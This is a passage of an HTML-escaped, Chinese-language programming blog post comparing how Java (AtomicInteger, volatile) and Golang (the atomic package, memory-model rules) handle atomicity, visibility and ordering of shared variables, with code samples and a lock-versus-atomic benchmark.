punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;Counter&lt;/span&gt; counter &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Counter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;times&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        executorService&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            counter&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;incrementAndGet&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    executorService&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;shutdown&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;counter&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Counter&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;AtomicInteger&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;AtomicInteger&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;java-%E5%A6%82%E4%BD%95%E5%AF%A6%E4%BD%9C-happen-before%EF%BC%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#java-%E5%A6%82%E4%BD%95%E5%AF%A6%E4%BD%9C-happen-before%EF%BC%9F&quot;&gt;#&lt;/a&gt; Java 如何實作 happen-before？&lt;/h2&gt;
&lt;p&gt;Java 提供了 volatile 關鍵字用來處理 happen before，一但變數在宣告時加上 volatile，對該變數的存取即保證可見性和有序性（注意，原子性不在保證內）。以下便是將開頭講的兩個可見性和有序性的例子，使用 volatile 關鍵字宣告共有變數，便可以保證 happen-before。&lt;/p&gt;
&lt;p&gt;以開頭第二個可見性的例子來說：&lt;/p&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;InterruptedException&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;Flag&lt;/span&gt; flag &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Flag&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt; t1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;flag&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;bool&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token comment&quot;&gt;// do nothing&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    t1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt; t2 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        flag&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;bool &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;flag&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;bool&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    t2&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;flag&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;bool&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    t1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Unreachable&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Flag&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;boolean&lt;/span&gt;  bool &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;當 flag 使參數使用 volatile 修飾後，thread t1 會馬上感知到 thread t2 在第 12 行對 flag 的異動，到 main memory 讀取最新的值，然後逃離迴圈。&lt;/p&gt;
&lt;p&gt;而以有序性的例子來看 volatile：&lt;/p&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; a&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;b&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt; t1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            a&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            b&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        t1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;b&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; a&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; err &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;%th round, Non thread safe!&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;err&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;err&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;        t1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;加入 a, b 兩個變數加入 volatile 修飾後，即可確保 a 之前的 code 一定會在 a 之前執行，b 之前的 code 一定會在 b 之前執行，因此 thread t1 的 CPU 指令會保證執行順序一定是 a=2, b=1。而對 main thread 而言，就永遠不會看到 b=1, a=0 這種亂序行為了。&lt;/p&gt;
&lt;h1 id=&quot;golang&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#golang&quot;&gt;#&lt;/a&gt; Golang&lt;/h1&gt;
&lt;h2 id=&quot;golang-%E5%A6%82%E4%BD%95%E8%99%95%E7%90%86%E5%8E%9F%E5%AD%90%E6%80%A7%EF%BC%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#golang-%E5%A6%82%E4%BD%95%E8%99%95%E7%90%86%E5%8E%9F%E5%AD%90%E6%80%A7%EF%BC%9F&quot;&gt;#&lt;/a&gt; Golang 如何處理原子性？&lt;/h2&gt;
&lt;p&gt;Golang 也有提供自己的 atomic tool kit，還記得最開頭使用 Lock 的 Golang 範例嗎? 可以改成用 atomic 來處理如下：&lt;/p&gt;
&lt;pre class=&quot;language-go&quot;&gt;&lt;code class=&quot;language-go&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;BenchmarkFib10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;b &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;testing&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;B&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; n &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; n &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; b&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;N&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; n&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		a &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;int64&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;			atomic&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;AddInt64&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以用 atomic 替換掉 Lock，同時達到原子性效果。&lt;/p&gt;
&lt;p&gt;附上兩種寫法的 benchmark:&lt;/p&gt;
&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;BenchmarkLock-8 &lt;span class=&quot;token number&quot;&gt;9266&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;134075&lt;/span&gt; ns/op &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt; B/op &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; allocs/op  &lt;br&gt;BenchmarkAtomic-8 &lt;span class=&quot;token number&quot;&gt;19225&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;62309&lt;/span&gt; ns/op &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt; B/op &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; allocs/op&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;相較之下可以看到 Lock 的確很吃效能。下圖附上對 atomic 範例的 profiling&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable/atomic-profiling.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;可以看到 cpu 並沒有花太多時間在處理同步上。&lt;/p&gt;
&lt;h2 id=&quot;golang-%E5%A6%82%E4%BD%95%E5%AF%A6%E4%BD%9C-happen-before%EF%BC%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#golang-%E5%A6%82%E4%BD%95%E5%AF%A6%E4%BD%9C-happen-before%EF%BC%9F&quot;&gt;#&lt;/a&gt; Golang 如何實作 happen-before？&lt;/h2&gt;
&lt;p&gt;根據 Golang &lt;a href=&quot;https://golang.org/ref/mem&quot;&gt;官方 blog&lt;/a&gt; 說明了下面幾種情況 Golang 保證 happen before：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Initialization&lt;/li&gt;
&lt;li&gt;Goroutine creation&lt;/li&gt;
&lt;li&gt;Goroutine destruction&lt;/li&gt;
&lt;li&gt;Channel communication&lt;/li&gt;
&lt;li&gt;Locks&lt;/li&gt;
&lt;li&gt;Once&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;但美中不足的是 Golang 並沒有像 Java 的 volatile 可以保證某個變數的 happen before。&lt;/p&gt;
&lt;p&gt;已可見性來說，下面這段 code:&lt;/p&gt;
&lt;pre class=&quot;language-go&quot;&gt;&lt;code class=&quot;language-go&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;&lt;br&gt;	flag &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;br&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; flag &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;			&lt;span class=&quot;token keyword&quot;&gt;continue&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;		fmt&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span 